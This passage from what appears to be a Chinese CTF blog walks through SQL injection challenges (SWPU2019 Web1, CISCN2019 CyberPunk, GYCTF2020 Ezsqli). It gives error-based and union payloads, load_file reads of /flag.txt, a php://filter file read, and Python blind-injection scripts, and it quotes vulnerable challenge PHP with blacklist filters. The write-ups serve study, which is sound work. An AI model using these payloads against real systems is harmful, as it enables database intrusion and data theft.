class="string">&#x27;oldpass&#x27;</span> : <span class="string">&#x27;1&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;newpass&#x27;</span> : <span class="string">&#x27;1&#x27;</span>,</span><br><span class="line">    &#125;</span><br><span class="line">    flagg = res.post(url=url3, data=data)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;XPATH&#x27;</span> <span class="keyword">in</span> flagg.text:</span><br><span class="line">        <span class="built_in">print</span>(flagg.text)    </span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">go</span>(<span class="params">username</span>):</span><br><span class="line">    register(username)</span><br><span class="line">    login(username)</span><br><span class="line">    change()</span><br><span class="line"></span><br><span class="line">go(<span class="string">&#x27;1&quot;||(extractvalue(1,concat(0x7e,(select(group_concat(table_name))from(information_schema.tables)where(table_schema=database())))))#1&#x27;</span>)</span><br><span class="line">go(<span class="string">&#x27;1&quot;||(extractvalue(1,concat(0x7e,(select(group_concat(column_name))from(information_schema.columns)where(table_name=&quot;users&quot;)))))#1&#x27;</span>)</span><br><span class="line">go(<span class="string">&#x27;1&quot;||extractvalue(1,concat(0x7e,(select(group_concat(real_flag_1s_here))from(users)where(real_flag_1s_here)regexp(&quot;^f&quot;))))#1&#x27;</span>)</span><br><span class="line">go(<span class="string">&#x27;1&quot;||extractvalue(1,concat(0x7e,reverse((select(group_concat(real_flag_1s_here))from(users)where(real_flag_1s_here)regexp(&quot;^f&quot;)))))#1&#x27;</span>)</span><br></pre></td></tr></table></figure></div>

<blockquote>
<p>首先得明白需要请求多个页面 -&gt; 如何让它知道你是同一个用户</p>
<p><code>requests.session()</code>的运用</p>
</blockquote>
<h4 id="知识点："><a href="#知识点：" class="headerlink" title="知识点："></a>知识点：</h4><ol>
<li>空格被过滤&#x2F;**&#x2F;被过滤 &#x3D;&gt; ()</li>
<li>reverse函数逆向输出</li>
<li>更加熟悉了二次注入</li>
<li>报错注入[ 本地有笔记 ]</li>
<li>and被过滤时 &#x3D;&gt; ||</li>
<li>多有多个页面时 如何编写python来自动化获取flag</li>
</ol>
<h4 id="参考："><a href="#参考：" class="headerlink" title="参考："></a>参考：</h4><p><a class="link" href="https://blog.csdn.net/mochu7777777/article/details/105179021">Wp <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<hr>
<h2 id="SWPU2019-Web1-二次注入题"><a href="#SWPU2019-Web1-二次注入题" class="headerlink" title="[SWPU2019]Web1 二次注入题"></a>[SWPU2019]Web1 二次注入题</h2><p><strong>参考</strong>:<a class="link" href="https://blog.csdn.net/satasun/article/details/109391116">https://blog.csdn.net/satasun/article/details/109391116 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<hr>
<p>知识点:</p>
<ul>
<li><input disabled type="checkbox"> <a class="link" href="https://blog.csdn.net/qq_46091464/article/details/105899269">二次注入 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></li>
<li><input disabled type="checkbox"> <a class="link" href="https://zhuanlan.zhihu.com/p/98206699">无列名注入 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></li>
<li><input disabled type="checkbox"> <a class="link" href="https://www.anquanke.com/post/id/193512">information_schema的过滤 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></li>
</ul>
<hr>
<h4 id="1-二次注入"><a href="#1-二次注入" class="headerlink" title="1.二次注入"></a>1.二次注入</h4><p><strong>原理</strong></p>
<p>1.用户向数据库中插入恶意数据（即使后端代码对语句进行了转义，如mysql_escape_string、mysql_real_escape_string转义）</p>
<p>2.数据库对自己存储的数据非常放心，直接取出恶意数据给用户</p>
<p><strong>过程</strong></p>
<p>(1)插入1’#</p>
<p>(2)转义成了1’\#</p>
<p>(3)放在数据库中还是1’#</p>
<p>(4)再取出这些数据时，不会转义 &#x3D;&gt; 取出的是 1’# &#x3D;&gt; 完成注入</p>
<h4 id="2-无列名注入-—-在不知道列名的情况下进行sql注入"><a href="#2-无列名注入-—-在不知道列名的情况下进行sql注入" class="headerlink" title="2.无列名注入 — 在不知道列名的情况下进行sql注入."></a>2.无列名注入 — 在不知道列名的情况下进行sql注入.</h4><p>在mysql&gt;&#x3D;5的版本中，有一个information_schema的库，里面记录着mysql所有表的结构，在sql注入中，我们会通过这个库来获取其他表的结构（列名，表名）。</p>
<p><strong>原理</strong></p>
<p>将我们不知道的列名进行取别名操作，在取别名的同时进行数据查询。</p>
<p><strong>操作</strong></p>
<p>1.<code>select * from list;</code></p>
<p><img lazyload src="/images/loading.svg" data-src="/CTF/Web/%E4%BA%8C%E6%AC%A1%E6%B3%A8%E5%85%A5/sql00.png"></p>
<p>2.<code>select 1,2,3 union select * from list;</code></p>
<p><img lazyload src="/images/loading.svg" data-src="/CTF/Web/%E4%BA%8C%E6%AC%A1%E6%B3%A8%E5%85%A5/sql01.png"></p>
<p>3.select <code>3</code> from (select 1,2,3 union select * from list)a;</p>
<p>-&gt;末尾的a可以是任意字符，用于命名</p>
<p><img lazyload src="/images/loading.svg" data-src="/CTF/Web/%E4%BA%8C%E6%AC%A1%E6%B3%A8%E5%85%A5/sql02.png"></p>
<p>4.<code>select b from (select 1,2,3 as b union select * from list)a;</code></p>
<p>-&gt;如果过滤了&#96;&#96;反引号，起别名</p>
<p><img lazyload src="/images/loading.svg" data-src="/CTF/Web/%E4%BA%8C%E6%AC%A1%E6%B3%A8%E5%85%A5/sql03.png"></p>
<p>5.select concat(<code>2</code>,0x2d,<code>3</code>) from (select 1,2,3 union select * from list)a limit 1,3;</p>
<p>-&gt;多列查询</p>
<p><img lazyload src="/images/loading.svg" data-src="/CTF/Web/%E4%BA%8C%E6%AC%A1%E6%B3%A8%E5%85%A5/sql04.png"></p>
<p>payload: <strong>select a,b from posts where a&#x3D;-1 union select 1,(select concat(<code>3</code>,0x2d,<code>4</code>) from (select 1,2,3,4,5,6 union select * from xxx)a limit 1,1);</strong></p>
<h4 id="3-bypass-information-schema"><a href="#3-bypass-information-schema" class="headerlink" title="3.bypass information_schema"></a>3.bypass information_schema</h4><p><code>information_schema是什么?</code></p>
<p>-&gt;保存着mysql服务器所维护的所有其他数据库的信息，包括了数据库名，表名，字段名等。</p>
<p>-&gt;在注入中，infromation_schema库的作用无非就是可以获取到table_schema,table_name,column_name这些数据库内的信息。</p>
<p><strong>Mysql在5.7版本新增了sys schema 基础数据来自于performance_chema和information_schema两个库，本身数据库不存储数据。</strong></p>
<p>sys.schema_auto_increment_columns</p>
<p>-&gt;对表自增字段的监控.</p>
<p>-&gt;只要有自增字段，那么就可以通过这个库来查询到 &#x3D;&gt; 代替了information_schema</p>
<p><strong>前提: 注入的表中存在自增字段</strong></p>
<p>如果没有呢（下面两个可以代替）</p>
<p>-&gt;schema_table_statistics_with_buffer</p>
<p>-&gt; sys.x$schema_flattened_keys</p>
<p>-&gt;sys.x$schema_table_statistics_with_buffer</p>
<h4 id="解题："><a href="#解题：" class="headerlink" title="解题："></a>解题：</h4><p>进入网站，随便注册一个账号进入，可以发布广告 &#x3D;&gt; 想到了xss(不是很熟悉,不知道怎么去验证,看wp说是二次注入)</p>
<p><img lazyload src="/images/loading.svg" data-src="/CTF/Web/%E4%BA%8C%E6%AC%A1%E6%B3%A8%E5%85%A5/00.png"></p>
<p><img lazyload src="/images/loading.svg" data-src="/CTF/Web/%E4%BA%8C%E6%AC%A1%E6%B3%A8%E5%85%A5/01.png"></p>
<p>确定存在sql注入,且为二次注入 过滤了空格,or,注释符</p>
<p><strong>payload:</strong></p>
<p>1.<code>1&#39;/**/union/**/select/**/1,database(),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22&#39;</code></p>
<p><img lazyload src="/images/loading.svg" data-src="/CTF/Web/%E4%BA%8C%E6%AC%A1%E6%B3%A8%E5%85%A5/payload00.png"></p>
<p>2.<code>1&#39;/**/union/**/select/**/1,database(),group_concat(table_name),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22/**/from/**/mysql.innodb_table_stats/**/where/**/database_name=&quot;web1&quot;&#39;</code></p>
<p><img lazyload src="/images/loading.svg" data-src="/CTF/Web/%E4%BA%8C%E6%AC%A1%E6%B3%A8%E5%85%A5/payload01.png"></p>
<p>3.<code>1&#39;/**/union/**/select/**/1,database(),(select/**/group_concat(b)/**/from/**/(select/**/1,2/**/as/**/a,3/**/as/**/b/**/union/**/select/**/*/**/from/**/users)a),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22&#39;</code></p>
<p><img lazyload src="/images/loading.svg" data-src="/CTF/Web/%E4%BA%8C%E6%AC%A1%E6%B3%A8%E5%85%A5/payload03.png"></p>
<hr>
<h2 id="CISCN2019-华北赛区-Day1-Web5-CyberPunk-php伪协议-二次注入"><a href="#CISCN2019-华北赛区-Day1-Web5-CyberPunk-php伪协议-二次注入" class="headerlink" title="[CISCN2019 华北赛区 Day1 Web5]CyberPunk [ php伪协议 二次注入 ]"></a>[CISCN2019 华北赛区 Day1 Web5]CyberPunk [ php伪协议 二次注入 ]</h2><p>打开环境，看源码最后有一个提示： <!--?file=?--></p>
<p>-&gt; php伪协议读取文件</p>
<p><code>url/index.php?file=php://filter/read/convert.base64-encode/resource=index.php</code></p>
<div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">#index.php的源码</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">ini_set</span>(<span class="string">&#x27;open_basedir&#x27;</span>, <span class="string">&#x27;/var/www/html/&#x27;</span>);</span><br><span class="line"><span class="comment">// $file = $_GET[&quot;file&quot;];</span></span><br><span class="line"><span class="variable">$file</span> = (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>]) ? <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>] : <span class="literal">null</span>);</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$file</span>))&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/phar|zip|bzip2|zlib|data|input|%00/i&quot;</span>,<span class="variable">$file</span>)) &#123;</span><br><span class="line">        <span class="keyword">echo</span>(<span class="string">&#x27;no way!&#x27;</span>);</span><br><span class="line">        <span class="keyword">exit</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    @<span class="keyword">include</span>(<span class="variable">$file</span>);<span class="comment">#伪协议点</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></div>

<div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">#search.php源码</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">require_once</span> <span class="string">&quot;config.php&quot;</span>; </span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">empty</span>(<span class="variable">$_POST</span>[<span class="string">&quot;user_name&quot;</span>]) &amp;&amp; !<span class="keyword">empty</span>(<span class="variable">$_POST</span>[<span class="string">&quot;phone&quot;</span>]))</span><br><span class="line">&#123;</span><br><span class="line">    <span class="variable">$msg</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">    <span class="variable">$pattern</span> = <span class="string">&#x27;/select|insert|update|delete|and|or|join|like|regexp|where|union|into|load_file|outfile/i&#x27;</span>;</span><br><span class="line">    <span class="variable">$user_name</span> = <span class="variable">$_POST</span>[<span class="string">&quot;user_name&quot;</span>];</span><br><span class="line">    <span class="variable">$phone</span> = <span class="variable">$_POST</span>[<span class="string">&quot;phone&quot;</span>];</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="variable">$pattern</span>,<span class="variable">$user_name</span>) || <span class="title function_ invoke__">preg_match</span>(<span class="variable">$pattern</span>,<span class="variable">$phone</span>))&#123; </span><br><span class="line">        <span class="variable">$msg</span> = <span class="string">&#x27;no sql inject!&#x27;</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="variable">$sql</span> = <span class="string">&quot;select * from `user` where `user_name`=&#x27;<span class="subst">&#123;$user_name&#125;</span>&#x27; and `phone`=&#x27;<span class="subst">&#123;$phone&#125;</span>&#x27;&quot;</span>;</span><br><span class="line">        <span class="variable">$fetch</span> = <span class="variable">$db</span>-&gt;<span class="title function_ invoke__">query</span>(<span class="variable">$sql</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$fetch</span>) &amp;&amp; <span class="variable">$fetch</span>-&gt;num_rows&gt;<span class="number">0</span>)&#123;</span><br><span class="line">        <span class="variable">$row</span> = <span class="variable">$fetch</span>-&gt;<span class="title function_ invoke__">fetch_assoc</span>(); <span class="comment"># fetch_assoc();这个函数用于从结果集中获取一行数据</span></span><br><span class="line">        <span class="keyword">if</span>(!<span class="variable">$row</span>) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&#x27;error&#x27;</span>;</span><br><span class="line">            <span class="title function_ invoke__">print_r</span>(<span class="variable">$db</span>-&gt;error);</span><br><span class="line">            <span class="keyword">exit</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable">$msg</span> = <span class="string">&quot;&lt;p&gt;姓名:&quot;</span>.<span class="variable">$row</span>[<span class="string">&#x27;user_name&#x27;</span>].<span class="string">&quot;&lt;/p&gt;&lt;p&gt;, 电话:&quot;</span>.<span class="variable">$row</span>[<span class="string">&#x27;phone&#x27;</span>].<span class="string">&quot;&lt;/p&gt;&lt;p&gt;, 地址:&quot;</span>.<span class="variable">$row</span>[<span class="string">&#x27;address&#x27;</span>].<span class="string">&quot;&lt;/p&gt;&quot;</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="variable">$msg</span> = <span class="string">&quot;未找到订单!&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="variable">$msg</span> = <span class="string">&quot;信息不全&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></div>

<div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">#change.php源码</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">require_once</span> <span class="string">&quot;config.php&quot;</span>;</span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">empty</span>(<span class="variable">$_POST</span>[<span class="string">&quot;user_name&quot;</span>]) &amp;&amp; !<span class="keyword">empty</span>(<span class="variable">$_POST</span>[<span class="string">&quot;address&quot;</span>]) &amp;&amp; !<span class="keyword">empty</span>(<span class="variable">$_POST</span>[<span class="string">&quot;phone&quot;</span>]))</span><br><span class="line">&#123;</span><br><span class="line">    <span class="variable">$msg</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">    <span class="variable">$pattern</span> = <span class="string">&#x27;/select|insert|update|delete|and|or|join|like|regexp|where|union|into|load_file|outfile/i&#x27;</span>;</span><br><span class="line">    <span class="variable">$user_name</span> = <span class="variable">$_POST</span>[<span class="string">&quot;user_name&quot;</span>];</span><br><span class="line">    <span class="variable">$address</span> = <span class="title function_ invoke__">addslashes</span>(<span class="variable">$_POST</span>[<span class="string">&quot;address&quot;</span>]);</span><br><span class="line"><span class="comment"># 函数返回在预定义字符之前添加反斜杠的字符串。预定义字符是单引号（&#x27;）双引号（&quot;）反斜杠（\）NULL&lt;/p&gt;&lt;br/&gt;</span></span><br><span class="line">    <span class="variable">$phone</span> = <span class="variable">$_POST</span>[<span class="string">&quot;phone&quot;</span>];</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="variable">$pattern</span>,<span class="variable">$user_name</span>) || <span class="title function_ invoke__">preg_match</span>(<span class="variable">$pattern</span>,<span class="variable">$phone</span>))&#123;</span><br><span class="line">        <span class="variable">$msg</span> = <span class="string">&#x27;no sql inject!&#x27;</span>; <span class="comment"># 黑名单过滤username 和 phone</span></span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="variable">$sql</span> = <span class="string">&quot;select * from `user` where `user_name`=&#x27;<span class="subst">&#123;$user_name&#125;</span>&#x27; and `phone`=&#x27;<span class="subst">&#123;$phone&#125;</span>&#x27;&quot;</span>;</span><br><span class="line">        <span class="variable">$fetch</span> = <span class="variable">$db</span>-&gt;<span class="title function_ invoke__">query</span>(<span class="variable">$sql</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$fetch</span>) &amp;&amp; <span class="variable">$fetch</span>-&gt;num_rows&gt;<span class="number">0</span>)&#123;</span><br><span class="line">        <span class="variable">$row</span> = <span class="variable">$fetch</span>-&gt;<span class="title function_ invoke__">fetch_assoc</span>();</span><br><span class="line">        <span class="variable">$sql</span> = <span class="string">&quot;update `user` set `address`=&#x27;&quot;</span>.<span class="variable">$address</span>.<span class="string">&quot;&#x27;, `old_address`=&#x27;&quot;</span>.<span class="variable">$row</span>[<span class="string">&#x27;address&#x27;</span>].<span class="string">&quot;&#x27; where `user_id`=&quot;</span>.<span class="variable">$row</span>[<span class="string">&#x27;user_id&#x27;</span>];</span><br><span class="line">        <span class="variable">$result</span> = <span class="variable">$db</span>-&gt;<span class="title function_ invoke__">query</span>(<span class="variable">$sql</span>);</span><br><span class="line">        <span class="keyword">if</span>(!<span class="variable">$result</span>) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&#x27;error&#x27;</span>;</span><br><span class="line">            <span class="title function_ invoke__">print_r</span>(<span class="variable">$db</span>-&gt;error);</span><br><span class="line">            <span class="keyword">exit</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable">$msg</span> = <span class="string">&quot;订单修改成功&quot;</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="variable">$msg</span> = <span class="string">&quot;未找到订单!&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="variable">$msg</span> = <span class="string">&quot;信息不全&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></div>

<div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">#delete.php源码</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">require_once</span> <span class="string">&quot;config.php&quot;</span>;</span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">empty</span>(<span class="variable">$_POST</span>[<span class="string">&quot;user_name&quot;</span>]) &amp;&amp; !<span class="keyword">empty</span>(<span class="variable">$_POST</span>[<span class="string">&quot;phone&quot;</span>]))</span><br><span class="line">&#123;</span><br><span class="line">    <span class="variable">$msg</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">    <span class="variable">$pattern</span> = <span class="string">&#x27;/select|insert|update|delete|and|or|join|like|regexp|where|union|into|load_file|outfile/i&#x27;</span>;</span><br><span class="line">    <span class="variable">$user_name</span> = <span class="variable">$_POST</span>[<span class="string">&quot;user_name&quot;</span>];</span><br><span class="line">    <span class="variable">$phone</span> = <span class="variable">$_POST</span>[<span class="string">&quot;phone&quot;</span>];</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="variable">$pattern</span>,<span class="variable">$user_name</span>) || <span class="title function_ invoke__">preg_match</span>(<span class="variable">$pattern</span>,<span class="variable">$phone</span>))&#123; </span><br><span class="line">        <span class="variable">$msg</span> = <span class="string">&#x27;no sql inject!&#x27;</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="variable">$sql</span> = <span class="string">&quot;select * from `user` where `user_name`=&#x27;<span class="subst">&#123;$user_name&#125;</span>&#x27; and `phone`=&#x27;<span class="subst">&#123;$phone&#125;</span>&#x27;&quot;</span>;</span><br><span class="line">        <span class="variable">$fetch</span> = <span class="variable">$db</span>-&gt;<span class="title function_ invoke__">query</span>(<span class="variable">$sql</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$fetch</span>) &amp;&amp; <span class="variable">$fetch</span>-&gt;num_rows&gt;<span class="number">0</span>)&#123;</span><br><span class="line">        <span class="variable">$row</span> = <span class="variable">$fetch</span>-&gt;<span class="title function_ invoke__">fetch_assoc</span>();</span><br><span class="line">        <span class="variable">$result</span> = <span class="variable">$db</span>-&gt;<span class="title function_ invoke__">query</span>(<span class="string">&#x27;delete from `user` where `user_id`=&#x27;</span> . <span class="variable">$row</span>[<span class="string">&quot;user_id&quot;</span>]);</span><br><span class="line">        <span class="keyword">if</span>(!<span class="variable">$result</span>) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&#x27;error&#x27;</span>;</span><br><span class="line">            <span class="title function_ invoke__">print_r</span>(<span class="variable">$db</span>-&gt;error);</span><br><span class="line">            <span class="keyword">exit</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable">$msg</span> = <span class="string">&quot;订单删除成功&quot;</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="variable">$msg</span> = <span class="string">&quot;未找到订单!&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="variable">$msg</span> = <span class="string">&quot;信息不全&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></div>

<p>多个界面，多个输入点，姓名，电话，地址</p>
<p>-&gt; 姓名 和 电话有相同的黑名单过滤</p>
<p>-&gt; 地址有一个<code>addslashes()</code>函数</p>
<p><strong>二次注入，注入点在 地址处</strong></p>
<p>提交订单处的address()写入payload，在更改地址处随意填写，提交 &#x3D;&#x3D;&gt; 报错，回显</p>
<p>payload1：<code>1&#39; and updatexml(1,concat(0x7e,(select substr(load_file(&#39;/flag.txt&#39;),1,30)),0x7e),1)#</code></p>
<p>payload2：<code>1&#39; and updatexml(1,concat(0x7e,(select substr(load_file(&#39;/flag.txt&#39;),28,50)),0x7e),1)#</code></p>
<p>报错注入的结果是有长度限制的.</p>
<h2 id="GYCTF2020-Ezsqli-Bypass-information库-偏移注入"><a href="#GYCTF2020-Ezsqli-Bypass-information库-偏移注入" class="headerlink" title="[GYCTF2020]Ezsqli [ Bypass information库  偏移注入 ]"></a>[GYCTF2020]Ezsqli [ Bypass information库  偏移注入 ]</h2><h4 id="Bypasss-information库"><a href="#Bypasss-information库" class="headerlink" title="Bypasss information库"></a>Bypasss information库</h4><p>通过测试，主要是过滤了for - 即无法用information_schema库</p>
<p>用其他的库来代替，要多试几个 - 因为有些库里面的表可能不完全 - 我试了有三个，只有一个是有flag表的，另外几个都只有user2333这个表</p>
<p>获取表名<code>f1ag_1s_h3r3_hhhhh,users233333333333333</code></p>
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://055afa4b-34b4-4c9a-bcab-f1ea5f114242.node5.buuoj.cn:81/&quot;</span></span><br><span class="line">result = <span class="string">&#x27;&#x27;</span></span><br><span class="line">i = <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    head = <span class="number">32</span></span><br><span class="line">    tail = <span class="number">127</span></span><br><span class="line">    i = i + <span class="number">1</span></span><br><span class="line">    <span class="keyword">while</span> head &lt; tail:</span><br><span class="line">        mid = (head + tail) &gt;&gt; <span class="number">1</span></span><br><span class="line">        payload = <span class="string">f&quot;0^(ascii(substr((select group_concat(table_name) from sys.x$schema_flattened_keys where table_schema = database()),<span class="subst">&#123;i&#125;</span>,1))&gt;<span class="subst">&#123;mid&#125;</span>)#&quot;</span></span><br><span class="line">        data = &#123;</span><br><span class="line">            <span class="string">&#x27;id&#x27;</span>:payload</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        r = requests.post(url=url,data=data)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;Nu1L&#x27;</span> <span class="keyword">in</span> r.text:</span><br><span class="line">            head = mid+<span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            tail = mid</span><br><span class="line">    <span class="keyword">if</span> head != <span class="number">32</span>:</span><br><span class="line">        result += <span class="built_in">chr</span>(head)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    <span class="built_in">print</span>(result)</span><br></pre></td></tr></table></figure></div>

<p>得到了表名了，没找到 既 可以替代information_schema库 且 包含列名信息的库</p>
<h4 id="无列名注入"><a href="#无列名注入" class="headerlink" title="无列名注入"></a>无列名注入</h4><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">url = <span class="string">&quot;http://644703fe-4b31-43c3-b8c5-9553110650b9.node5.buuoj.cn:81/&quot;</span></span><br><span class="line">flag = <span class="string">&quot;&quot;</span></span><br><span class="line">i = <span class="number">0</span></span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    i = i + <span class="number">1</span></span><br><span class="line">    letf = <span class="number">32</span></span><br><span class="line">    right = <span class="number">127</span></span><br><span class="line">    <span class="keyword">while</span> letf &lt; right:</span><br><span class="line">        s = flag</span><br><span class="line">        mid = (letf+right) // <span class="number">2</span></span><br><span class="line">        s = s + <span class="built_in">chr</span>(mid)</span><br><span class="line">        payload = <span class="string">f&quot;0^((select * from f1ag_1s_h3r3_hhhhh)&gt;(select 1,&#x27;<span class="subst">&#123;s&#125;</span>&#x27;))^0&quot;</span></span><br><span class="line">        data = &#123;<span class="string">&quot;id&quot;</span>:payload&#125;</span><br><span class="line">        res = requests.post(url=url,data=data).text</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;Nu1L&quot;</span> <span class="keyword">in</span> res:</span><br><span class="line">            letf = mid + <span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            right = mid</span><br><span class="line">    <span class="keyword">if</span> letf != <span class="number">32</span>:</span><br><span class="line">        flag += <span class="built_in">chr</span>(letf-<span class="number">1</span>)</span><br><span class="line">        <span class="built_in">print</span>(flag)</span><br><span class="line">        time.sleep(<span class="number">0.2</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br></pre></td></tr></table></figure></div>

<p>核心点：<code>payload = f&quot;0^((select * from f1ag_1s_h3r3_hhhhh)&gt;(select 1,&#39;&#123;s&#125;&#39;))^0&quot;</code></p>
<p>-&gt; mysql中大于号是按位比较的（见下图），</p>
<p><code>flag += chr(letf-1)</code></p>
<p>-&gt; 因为这里的条件是大于，最后要-1</p>
<p>-&gt; 我一直想不通这里，想了一会，好像是因为：</p>
<p><strong>head：左边界 			tail：右边界 		target：目标值</strong></p>
<p>最后一次二分法一定是 head target(mid) tail 这样的形式，那么最后一次判断条件必须成立成立（满足大于号）</p>
<p>-&gt; head &#x3D; mid + 1 &#x3D;&#x3D;&gt; head&#x3D;&#x3D;tail 退出循环</p>
<p>也就是说，最后一次要满足 大于的条件，所以最后要-1</p>
<p><img lazyload src="/images/loading.svg" data-src="/%E4%BA%8C%E6%AC%A1%E6%B3%A8%E5%85%A5/4-26-00.png"></p>
<hr>
<h4 id="参考：-1"><a href="#参考：-1" class="headerlink" title="参考："></a>参考：</h4><p><a class="link" href="https://blog.csdn.net/l2872253606/article/details/125247898">wp <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<p><a class="link" href="https://blog.csdn.net/qq_43625917/article/details/104776287">wp <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<p><a class="link" href="https://www.anquanke.com/post/id/160584#h3-16">xor盲注以及其他盲注 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
]]></content>
      <categories>
        <category>Web</category>
      </categories>
      <tags>
        <tag>漏洞学习</tag>
        <tag>Web</tag>
      </tags>
  </entry>
</search>
